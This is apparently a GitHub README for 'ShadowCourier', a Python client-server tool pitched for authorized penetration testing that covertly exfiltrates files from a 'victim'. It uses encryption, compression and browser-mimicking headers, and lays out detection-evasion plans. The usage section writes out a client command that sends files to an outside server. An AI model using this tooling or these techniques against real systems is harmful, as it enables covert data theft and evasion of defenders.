# ShadowCourier 🕵️‍♂️

**Covert File Delivery for Penetration Testing**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.6+](https://img.shields.io/badge/Python-3.6+-blue.svg)](https://www.python.org/downloads/)

**ShadowCourier** is a stealthy, Python-based tool for secure file transfers in **authorized penetration testing** and **CTF labs**. With **AES-256-CBC encryption**, **gzip compression**, and **User-Agent rotation**, it mimics real-world covert operations while staying ethical. Perfect for red teamers and security enthusiasts who love a *Hacker Simulator* vibe.

> **⚠️ Ethical Use Only**: ShadowCourier is for **authorized testing** and **educational purposes**. Unauthorized use is illegal and unethical. Always obtain explicit permission before testing any system.

---

## 🌟 Features

- **🔒 Military-Grade Encryption**: Secures files with **AES-256-CBC** for safe transit.
- **📦 Compact Payloads**: **Gzip compression** shrinks files (e.g., 378B to 200B) for stealth.
- **🕵️ Stealthy Transfers**: Rotates **User-Agent** headers to blend into browser traffic.
- **🛠️ Easy Configuration**: Uses `shadow.conf` with environment variable overrides.
- **📂 Flexible Transfers**: Supports single files or directories with relative paths.
- **🔄 Reliable Delivery**: Configurable retries (default: 3) for unstable networks.
- **🎨 Cyberpunk Interface**: `tqdm` progress bars for a sleek, real-time experience.

**Stealth Score**: 🟠 **Moderate (6/10)**  
- **Pros**: Encrypted payloads, compressed data, browser-like headers.  
- **Cons**: HTTP headers and fixed ports are detectable. See [Future Enhancements](#future-enhancements).

---

## 🚀 Quick Start

1. **Clone the Repo**:
   ```bash
   git clone https://github.com/your-username/ShadowCourier.git
   cd ShadowCourier
   ```

2. **Set Up Server**:
   ```bash
   python3 -m venv server/env
   source server/env/bin/activate
   pip install pycryptodome
   python3 server/ghost_server.py
   ```

3. **Set Up Client**:
   ```bash
   python3 -m venv client/env
   source client/env/bin/activate
   pip install requests tqdm pycryptodome colorama
   python3 client/shadow_client.py path/to/test.file
   ```

4. **Configure**: Edit `server/shadow.conf` and `client/shadow.conf` with your server IP and settings.

---

## 🛠️ How It Works

ShadowCourier uses a client-server model for secure file transfers:

- **Ghost Server (`ghost_server.py`)**:
  - Listens on a configurable port (default: 8080) at `/upload`.
  - Receives JSON payloads, decrypts **AES-256-CBC** data, decompresses **gzip**, and saves files to `uploads/<victim_id>/`.
  - Logs transfers with client IP and file sizes.

- **Shadow Client (`shadow_client.py`)**:
  - Compresses files with **gzip**, encrypts with **AES-256-CBC**, and sends via HTTP POST.
  - Rotates **User-Agent** headers (Chrome, Firefox, etc.) for stealth.
  - Shows progress with `tqdm` bars and file size stats.

**Data Flow**:
```
[Client] -> Gzip -> AES-256-CBC -> Base64 -> JSON -> HTTP POST
[Server] <- HTTP POST <- JSON <- Base64 <- AES-256-CBC <- Gzip
```

**Sample Payload**:
```json
{
  "file": "base64_encrypted_data",
  "filename": "test.file",
  "key": "base64_aes_key",
  "iv": "base64_iv",
  "is_compressed": "true",
  "victim_id": "default_victim"
}
```

---

## 📋 Requirements

- **Python**: 3.6+ (tested on 3.8–3.11)
- **OS**: Linux (recommended), macOS, or Windows (adjust paths)
- **Dependencies**:
  - Server: `pycryptodome`
  - Client: `requests`, `tqdm`, `pycryptodome`, `colorama`

Install:
```bash
pip install requests tqdm pycryptodome colorama
```

---

## 🎮 Usage

### Start the Server
```bash
cd server
source env/bin/activate
python3 ghost_server.py --port 8080 --upload-dir ~/ShadowCourier/uploads
```
**Output**:
```
[*] Loaded config from shadow.conf
[*] Server online at 0.0.0.0:8080, saving to ~/ShadowCourier/uploads...
```

### Run the Client
```bash
cd client
source env/bin/activate
python3 shadow_client.py path/to/file --url http://<server-ip>:8080/upload
```
**Output**:
```
[*] Loaded config from shadow.conf
[*] Transferring 1 files to http://<server-ip>:8080/upload
[*] Size: 378B, compressed: 200B, encrypted: 280B
[+] Success: file transferred
```

**Options**:
- `--port <PORT>`: Server port.
- `--url <URL>`: Server endpoint.
- `--victim-id <ID>`: Custom ID for file organization.
- `--retries <N>`: Retry attempts.

---

## 🛡️ Stealth Analysis

- **Pros**: AES-256-CBC encryption, gzip compression, User-Agent rotation.
- **Cons**: HTTP headers and fixed ports are scannable.

**Stealth Score**: 🟠 **Moderate (6/10)**

---

## 🐛 Troubleshooting

- **Server Unreachable**:
  ```bash
  curl -v http://<server-ip>:8080/upload
  sudo ufw status
  ```

- **JSON Errors**:
  Check `file`, `filename`, `key`, `iv`, `is_compressed`, `victim_id` in payloads.

- **Dependencies**:
  ```bash
  pip install requests tqdm pycryptodome colorama
  ```

---

## 🔮 Future Enhancements

- **HTTPS**: Encrypt headers for stealth.
- **Dynamic Ports**: Avoid scans.
- **Proxies**: Add HTTP/SOCKS support.
- **Steganography**: Hide data in images.

Suggest features via GitHub Issues!

---

## 🤝 Contributing

1. Fork the repo.
2. Branch: `git checkout -b feature/awesome-idea`.
3. Commit: `git commit -m "Add awesome idea"`.
4. Push: `git push origin feature/awesome-idea`.
5. Open a Pull Request.

See [Code of Conduct](CODE_OF_CONDUCT.md).

---

## ⚖️ License

[MIT License](LICENSE)

---

## 📜 Disclaimer

For **educational and authorized use only**. Misuse is illegal. The developers are not liable for unethical actions.

---

**Star ⭐ the repo and hack ethically!** 🖥️🔒